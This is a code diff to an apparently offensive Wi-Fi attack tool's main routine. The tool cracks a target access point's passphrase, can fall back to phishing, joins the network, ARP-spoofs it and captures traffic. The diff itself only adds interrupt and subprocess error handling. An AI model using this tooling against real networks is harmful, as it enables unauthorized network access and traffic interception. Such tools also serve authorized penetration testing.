@@ -129,15 +129,20 @@ def main():
         if target:
             print("Attack data stored at '{}'.".format(target.dir_path))
 
-            interface.start_monitor_mode(target.channel)
-            wireless_unlocker = WirelessUnlocker(ap=target, monitoring_interface=interface)
             try:
+                interface.start_monitor_mode(target.channel)
+                wireless_unlocker = WirelessUnlocker(ap=target, monitoring_interface=interface)
                 print('Unlock targeted AP.')
                 wireless_unlocker.start()
             except PassphraseNotInAnyDictionaryError:
                 print('Passphrase not in any dictionary.')
+            except KeyboardInterrupt:
+                print('Stopping.')
+                config.cleanup()
+                return ExitCode.KEYBOARD_INTERRUPT.value
             finally:
-                interface.stop_monitor_mode()
+                if interface.monitor_mode:
+                    interface.stop_monitor_mode()
 
             if not (target.is_cracked() or 'OPN' in target.encryption):
                 if config.phishing_enabled:
@@ -176,16 +181,27 @@ def main():
 
             wireless_connecter = WirelessConnecter(interface=interface)
             print('Connecting to the AP.')
-            wireless_connecter.connect(target)
+            try:
+                wireless_connecter.connect(target)
+            except subprocess.CalledProcessError:
+                logger.error('netctl unexpectedly terminated.')
+                print('netctl unexpectedly terminated.', file=sys.stderr)
+                config.cleanup()
+                return ExitCode.SUBPROCESS_ERROR.value
+            except KeyboardInterrupt:
+                print('Stopping.')
+                config.cleanup()
+                return ExitCode.KEYBOARD_INTERRUPT.value
+
             print('Connection successful.')
 
             # change the network topology
 
             arp_spoofing = ArpSpoofing(interface=interface)
-            print('Changing topology of network.')
-            arp_spoofing.start()
-            print('Running until KeyboardInterrupt.')
             try:
+                print('Changing topology of network.')
+                arp_spoofing.start()
+                print('Running until KeyboardInterrupt.')
                 dumpcap = None
                 if config.capture_file:
                     dumpcap = Dumpcap(interface=interface, capture_file=config.capture_file)
